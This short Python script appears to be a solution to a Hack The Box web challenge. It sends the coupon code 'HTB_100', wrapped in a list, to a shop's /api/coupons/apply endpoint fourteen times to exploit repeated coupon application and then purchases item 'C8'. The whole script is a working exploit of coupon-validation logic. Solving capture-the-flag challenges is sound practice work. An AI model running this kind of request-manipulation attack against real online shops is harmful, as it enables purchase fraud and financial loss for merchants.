import requests

# host = 'http://localhost:1337'
host = 'http://178.128.37.153:32633'

s = requests.session()

s.get(host)

for i in range(14):
    res = s.post(f'{host}/api/coupons/apply', json={
        'coupon_code': ['HTB_100']
    })
    print(res.text)

res = s.post(f'{host}/api/purchase', json={
    'item': 'C8'
})

print(res.text)
